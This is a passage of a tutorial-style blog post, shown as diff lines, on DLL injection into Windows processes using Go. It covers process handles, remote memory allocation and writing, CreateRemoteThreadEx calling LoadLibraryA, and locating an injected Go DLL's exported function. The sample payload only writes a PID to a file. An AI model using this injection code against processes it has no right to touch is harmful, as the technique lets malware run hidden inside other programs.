+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">flags</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">windows</span>.<span style="color:#a6e22e">PROCESS_VM_OPERATION</span> | <span style="color:#a6e22e">windows</span>.<span style="color:#a6e22e">PROCESS_VM_READ</span> |   <span style="color:#a6e22e">windows</span>.<span style="color:#a6e22e">PROCESS_VM_WRITE</span> | <span style="color:#a6e22e">windows</span>.<span style="color:#a6e22e">PROCESS_CREATE_THREAD</span> | <span style="color:#a6e22e">windows</span>.<span style="color:#a6e22e">PROCESS_QUERY_INFORMATION</span>
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// get a handle to the process
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">pHandle</span>, <span style="color:#a6e22e">_</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">windows</span>.<span style="color:#a6e22e">OpenProcess</span>(uint32(<span style="color:#a6e22e">flags</span>), <span style="color:#66d9ef">false</span>, <span style="color:#a6e22e">pid</span>)
+</span></span></code></pre></div><p>In the previous snippet of code we ask the OS which kind of permissions we want in order to operate on the process we’re opening. Of course if our process is not privileged enough in regards to the process we’re going to open the operation will fail. Flags we need are permissions for reading/writing memory, querying its basic information and creating a thread into remote process. Then we specify as the second argument the process PID.</p>
+<p>Once we’ve a process handle, next task will be to reserve a portion of memory into its VAD (virtual address space) which we’ll later use to write the DLL’s path. Since this function is not implemented into the Go x/sys/windows package, we’re going to call it indirectly:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#75715e">// obtain a windows.LazyDLL object
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">kernel32</span>             <span style="color:#f92672">:=</span> <span style="color:#a6e22e">windows</span>.<span style="color:#a6e22e">NewLazySystemDLL</span>(<span style="color:#e6db74">&#34;kernel32.dll&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// obtain a windows.LazyProc object
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">virtualAllocEx</span>       <span style="color:#f92672">:=</span> <span style="color:#a6e22e">kernel32</span>.<span style="color:#a6e22e">NewProc</span>(<span style="color:#e6db74">&#34;VirtualAllocEx&#34;</span>)
+</span></span></code></pre></div><p>Now we can implement a wrapper around VirtualAllocEx</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#75715e">// VirtualAllocEx wrapper
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">VirtualAllocEx</span>(<span style="color:#a6e22e">pHandle</span> <span style="color:#a6e22e">windows</span>.<span style="color:#a6e22e">Handle</span>, <span style="color:#a6e22e">size</span>, <span style="color:#a6e22e">allocType</span>, <span style="color:#a6e22e">allocProt</span> <span style="color:#66d9ef">uintptr</span>) (<span style="color:#66d9ef">uintptr</span>, <span style="color:#66d9ef">error</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// allocate virtual memory into remote process
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">addr</span>, <span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">virtualAllocEx</span>.<span style="color:#a6e22e">Call</span>(
+</span></span><span style="display:flex;"><span>        uintptr(<span style="color:#a6e22e">pHandle</span>),   <span style="color:#75715e">// handle
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        uintptr(<span style="color:#ae81ff">0</span>),         <span style="color:#75715e">// addr where allocate (0 since we ask the OS to assign one)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        uintptr(<span style="color:#a6e22e">size</span>),      <span style="color:#75715e">// size of allocation
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        uintptr(<span style="color:#a6e22e">allocType</span>), <span style="color:#75715e">// type of allocation
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        uintptr(<span style="color:#a6e22e">allocProt</span>)) <span style="color:#75715e">// protection of the allocation
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">addr</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">err</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">addr</span>, <span style="color:#66d9ef">nil</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>We specify the required parameters to the Call function, the process handle, the allocation size and the protection flags, we default the allocation address to 0 since we leave the task to choose an address for the mapping to the OS. Notice that we do not check directly for error, but instead we check if the addr is equal to 0. We do this because the return from VirtualAllocEx is NULL in case of error, and one should later check about the error code calling GetLastError Windows API. The LazyProc.Call combines this behavior, so we return err just in case addr == 0. Since all the wrappers we’re going to write are implemented in the same way, I’m not going to repeat this concept further.</p>
+<p>In order to invoke our wrapper we do:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#75715e">// flags for VirtualAllocEx
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">allocType</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">windows</span>.<span style="color:#a6e22e">MEM_RESERVE</span> | <span style="color:#a6e22e">windows</span>.<span style="color:#a6e22e">MEM_COMMIT</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">allocProt</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">windows</span>.<span style="color:#a6e22e">PAGE_READWRITE</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">size</span> <span style="color:#f92672">:=</span> <span style="color:#ae81ff">4096</span>
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// alloc virtual memory into remote process and grab the address
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">addr</span>, <span style="color:#a6e22e">_</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">VirtualAllocEx</span>(<span style="color:#a6e22e">pHandle</span>, uintptr(<span style="color:#a6e22e">size</span>), uintptr(<span style="color:#a6e22e">allocType</span>), uintptr(<span style="color:#a6e22e">allocProt</span>))
+</span></span></code></pre></div><p>We ask the OS to directly commit the memory (despite this will not allocate it, because memory will be allocated on the first access). We also specify READ/WRITE permissions and a size of 4K (specifying less won’t actually make sense since VirtualAllocEx will anyway default to a page boundary allocation). If the call succeeds we get back the address of the allocated memory into the remote process (this means that this address is valid just into the VAD of another process, and can’t be accessed directly from our process through e.g. a dereference).</p>
+<p>Now we can write the DLL path into the remote process memory, but in order to accomplish it we need to invoke the WriteProcessMemory function. We need to write a wrapper for it too since not directly available into the Go package.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#75715e">// resolve the windows.LazyProc object
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">writeProcessMemory</span>   = <span style="color:#a6e22e">kernel32</span>.<span style="color:#a6e22e">NewProc</span>(<span style="color:#e6db74">&#34;WriteProcessMemory&#34;</span>)
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// WriteProcessMemory wrapper
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">WriteProcessMemory</span>(<span style="color:#a6e22e">pHandle</span> <span style="color:#a6e22e">windows</span>.<span style="color:#a6e22e">Handle</span>, <span style="color:#a6e22e">addr</span> <span style="color:#66d9ef">uintptr</span>, <span style="color:#a6e22e">path</span> <span style="color:#f92672">*</span><span style="color:#66d9ef">byte</span>, <span style="color:#a6e22e">len</span> <span style="color:#66d9ef">uintptr</span>) (<span style="color:#a6e22e">ret</span> <span style="color:#66d9ef">uintptr</span>, <span style="color:#a6e22e">err</span> <span style="color:#66d9ef">error</span>) {
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// write DLL path into remote process memory
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">ret</span>, <span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">err</span> = <span style="color:#a6e22e">writeProcessMemory</span>.<span style="color:#a6e22e">Call</span>(
+</span></span><span style="display:flex;"><span>        uintptr(<span style="color:#a6e22e">pHandle</span>),                      <span style="color:#75715e">// process handle
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        uintptr(<span style="color:#a6e22e">addr</span>),                         <span style="color:#75715e">// remote process address
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        uintptr(<span style="color:#a6e22e">unsafe</span>.<span style="color:#a6e22e">Pointer</span>(<span style="color:#a6e22e">path</span>)),         <span style="color:#75715e">// buffer to write
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        uintptr(<span style="color:#a6e22e">len</span>),                          <span style="color:#75715e">// length of the buffer
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        uintptr(<span style="color:#ae81ff">0</span>)) <span style="color:#75715e">// bytes actually written (we set it to NULL)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">ret</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">err</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">ret</span>, <span style="color:#66d9ef">nil</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>We pass the process handle, the address into the remote process VAD, the buffer we are going to write and its length. We set to NULL the number of bytes written return variable (since we’re not interested in).</p>
+<p>We can now invoke it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#75715e">// convert string to pointer of bytes
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">pathBytes</span>, <span style="color:#a6e22e">_</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">windows</span>.<span style="color:#a6e22e">BytePtrFromString</span>(<span style="color:#a6e22e">dllPath</span>)
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// write DLL path to remote process memory
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">retWrite</span>, <span style="color:#a6e22e">_</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">WriteProcessMemory</span>(<span style="color:#a6e22e">pHandle</span>, <span style="color:#a6e22e">addr</span>, <span style="color:#a6e22e">pathBytes</span>, uintptr(len(<span style="color:#a6e22e">dllPath</span>)))
+</span></span></code></pre></div><p>WriteProcessMemory receives a pointer and we cannot of course pass a Go string we need a way to translate it to a *byte pointer. Luckily for us the package as BytePtrFromString facility which accomplishes the job.</p>
+<p>Now the last piece of the puzzle. We need to start a remote thread into the target process that will call LoadLibraryA(addressOfDLLPath). Another wrapper is necessary:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#75715e">// grab the LazyProc related to CreateRemoteThread
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">createRemoteThreadEx</span> = <span style="color:#a6e22e">kernel32</span>.<span style="color:#a6e22e">NewProc</span>(<span style="color:#e6db74">&#34;CreateRemoteThreadEx&#34;</span>)
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// CreateRemoteThreadEx wrapper
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">CreateRemoteThreadEx</span>(<span style="color:#a6e22e">pHandle</span> <span style="color:#a6e22e">windows</span>.<span style="color:#a6e22e">Handle</span>, <span style="color:#a6e22e">remoteProcAddr</span>, <span style="color:#a6e22e">argAddr</span> <span style="color:#66d9ef">uintptr</span>) (<span style="color:#a6e22e">handle</span> <span style="color:#66d9ef">uintptr</span>, <span style="color:#a6e22e">err</span> <span style="color:#66d9ef">error</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// create a remote thread into the targeted process
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">handle</span>, <span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">err</span> = <span style="color:#a6e22e">createRemoteThreadEx</span>.<span style="color:#a6e22e">Call</span>(
+</span></span><span style="display:flex;"><span>        uintptr(<span style="color:#a6e22e">pHandle</span>), <span style="color:#75715e">// process
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        uintptr(<span style="color:#ae81ff">0</span>),       <span style="color:#75715e">// security attributes NULL
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        uintptr(<span style="color:#ae81ff">0</span>),       <span style="color:#75715e">// 0 means stack size will be the default based on binary attributes
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">remoteProcAddr</span>,   <span style="color:#75715e">// address of the entry point for this thread
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">argAddr</span>,          <span style="color:#75715e">// address of the argument to the entry point function in this case &#34;LoadLibraryA(ourDllPAth)&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        uintptr(<span style="color:#ae81ff">0</span>),       <span style="color:#75715e">// thread creations flag default none, it starts executing
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        uintptr(<span style="color:#ae81ff">0</span>),       <span style="color:#75715e">// pointer to returned threadID, we don&#39;t need it
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    )
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">handle</span>, <span style="color:#a6e22e">err</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>OK, we just now need to invoke it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#75715e">// call LoadLibraryA(dllPath)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">remThreadHandle</span>, <span style="color:#a6e22e">_</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">CreateRemoteThreadEx</span>(<span style="color:#a6e22e">pHandle</span>, <span style="color:#a6e22e">loadLibraryA</span>.<span style="color:#a6e22e">Addr</span>(), <span style="color:#a6e22e">addr</span>)
+</span></span></code></pre></div><p>So this was the recipe to inject a DLL in Go in Windows process, it is identical to what one would have done for example in C, except we’re using Go abstractions and the x/sys/windows package.</p>
+<h3 id="injecting-a-dll-written-in-go">Injecting a DLL written in Go:</h3>
+<p>What we’ve assumed into the previous part of the post is that we’re injecting a DLL written in C/C++ or any other language which supports writing DLLs and that provides a DllMain function implemented. When a DLL gets loaded or unloaded, the DllMain gets invoked and should check the reason of its invocation, the next snippet of code should be self explanatory:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>BOOL WINAPI <span style="color:#a6e22e">DllMain</span>(
+</span></span><span style="display:flex;"><span>    HINSTANCE hinstDLL,  <span style="color:#75715e">// handle to DLL module
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    DWORD fdwReason,     <span style="color:#75715e">// reason for calling function
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    LPVOID lpReserved )  <span style="color:#75715e">// reserved
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Perform actions based on the reason for calling.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">switch</span>( fdwReason ) 
+</span></span><span style="display:flex;"><span>    { 
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> DLL_PROCESS_ATTACH:
+</span></span><span style="display:flex;"><span>         <span style="color:#75715e">// Initialize once for each new process.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>         <span style="color:#75715e">// Return FALSE to fail DLL load.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> DLL_THREAD_ATTACH:
+</span></span><span style="display:flex;"><span>         <span style="color:#75715e">// Do thread-specific initialization.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> DLL_THREAD_DETACH:
+</span></span><span style="display:flex;"><span>         <span style="color:#75715e">// Do thread-specific cleanup.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> DLL_PROCESS_DETACH:
+</span></span><span style="display:flex;"><span>         <span style="color:#75715e">// Perform any necessary cleanup.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> TRUE;  <span style="color:#75715e">// Successful DLL_PROCESS_ATTACH.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
+</span></span></code></pre></div><p>So basically whoever has implemented a DLL in a standard way can relay on the fact that as soon it gets loaded into the process the DllMain will give a chance to do something (benign or malicious intents).</p>
+<p>Unfortunately writing a DLL in Go will not produce the same effect, and if we compile a Go binary as a c-shared library, when loaded into the remote process it will just sticks there in memory doing nothing… Unless the target process does not call directly on some exported function. Let’s make an example:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> (
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;fmt&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;os&#34;</span>
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#e6db74">&#34;C&#34;</span>
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//export Init
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">Init</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">pid</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">Getpid</span>()
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">f</span>, <span style="color:#a6e22e">_</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">Create</span>(<span style="color:#e6db74">&#34;C:\\Users\\SomeUser\\Desktop\\test.txt&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">defer</span> <span style="color:#a6e22e">f</span>.<span style="color:#a6e22e">Close</span>()
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">f</span>.<span style="color:#a6e22e">WriteString</span>(<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Sprintf</span>(<span style="color:#e6db74">&#34;PID: %d\n&#34;</span>, <span style="color:#a6e22e">pid</span>))
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>This Go code exports a function called Init that will just write its PID into a file on the Desktop of SomeUser. The main function is empty, and this is for a reason: when we are going to compile a Go binary as a DLL its main function will never be called. And that’s obvious because as we said before the Windows loader will invoke something called DllMain. Let’s see if such function exists in a Go DLL binary and if there let’s examine what it does (notice that we need to specify the CC compiler variable in order to build a Go DLL on Windows, it actually just works with the mingw one):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>CC<span style="color:#f92672">=</span>x86_64-w64-mingw32-gcc go build -o some.dll -buildmode<span style="color:#f92672">=</span>c-shared some.go
+</span></span></code></pre></div><p><img src="/dll_inject_go.webp" alt="injection"></p>
+<p>When the DLL gets loaded its DllMain returns just TRUE. So its obvious that we need to find a way to tell the remote process it has to invoke something, e.g. our Init function.</p>
+<p>Theoretically we could just do the same thing we did in order to invoke the LoadLibraryA function using CreateRemoteThreadEx and giving it the address of Init. But fact is that for non system DLLs it can happen that they reside at some different addresses, in fact in case the VAD portion of a process the DLL would like to be loaded is already occupied, so the loader will fix and relocate it elsewhere into the target memory process. So, we need to understand where the DLL has been loaded and and where the Init function address resides. But how?</p>
+<p>Windows comes with a nice APIs to grab information about processes, loaded DLLs and heap memory status, this is the Tool Help Library. We’re also lucky enough because this set of APIs has been already wrapped into the x/sys/windows package.</p>
+<p>So in order to get where the DLL we just loaded resides into the remote process VAD we can use the following code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#75715e">// SearchModuleAddr returns the base address of a module
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">SearchModuleAddr</span>(<span style="color:#a6e22e">searchDLL</span> <span style="color:#66d9ef">string</span>, <span style="color:#a6e22e">pid</span> <span style="color:#66d9ef">uint32</span>) (<span style="color:#a6e22e">addr</span> <span style="color:#66d9ef">uintptr</span>, <span style="color:#a6e22e">size</span> <span style="color:#66d9ef">uint32</span>, <span style="color:#a6e22e">err</span> <span style="color:#66d9ef">error</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// create a snapshot
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">handle</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">windows</span>.<span style="color:#a6e22e">CreateToolhelp32Snapshot</span>(<span style="color:#a6e22e">windows</span>.<span style="color:#a6e22e">TH32CS_SNAPMODULE</span>, <span style="color:#a6e22e">pid</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Errorf</span>(<span style="color:#e6db74">&#34;failed to create snapshot: %s&#34;</span>, <span style="color:#a6e22e">err</span>.<span style="color:#a6e22e">Error</span>())
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// setup the entry with its own size
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">entry</span> <span style="color:#a6e22e">windows</span>.<span style="color:#a6e22e">ModuleEntry32</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">entry</span>.<span style="color:#a6e22e">Size</span> = uint32(<span style="color:#a6e22e">windows</span>.<span style="color:#a6e22e">SizeofModuleEntry32</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// get first entry
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">err</span> = <span style="color:#a6e22e">windows</span>.<span style="color:#a6e22e">Module32First</span>(<span style="color:#a6e22e">handle</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">entry</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Errorf</span>(<span style="color:#e6db74">&#34;failed to get first module: %s&#34;</span>, <span style="color:#a6e22e">err</span>.<span style="color:#a6e22e">Error</span>())
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// parse the exepath to a Unicode string
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">dllName</span> <span style="color:#a6e22e">windows</span>.<span style="color:#a6e22e">NTUnicodeString</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">windows</span>.<span style="color:#a6e22e">RtlInitUnicodeString</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">dllName</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">entry</span>.<span style="color:#a6e22e">ExePath</span>[<span style="color:#ae81ff">0</span>])
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// transform into Go string and get the DLL name
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">dllNameS</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">filepath</span>.<span style="color:#a6e22e">Base</span>(<span style="color:#a6e22e">dllName</span>.<span style="color:#a6e22e">String</span>())
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// check if it&#39;s the one we&#39;re looking for
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">dllNameS</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">searchDLL</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">addr</span> = <span style="color:#a6e22e">entry</span>.<span style="color:#a6e22e">ModBaseAddr</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">size</span> = <span style="color:#a6e22e">entry</span>.<span style="color:#a6e22e">ModBaseSize</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">err</span> = <span style="color:#a6e22e">windows</span>.<span style="color:#a6e22e">Module32Next</span>(<span style="color:#a6e22e">handle</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">entry</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">addr</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Errorf</span>(<span style="color:#e6db74">&#34;unable to retrieve: %s library&#34;</span>, <span style="color:#a6e22e">searchDLL</span>)
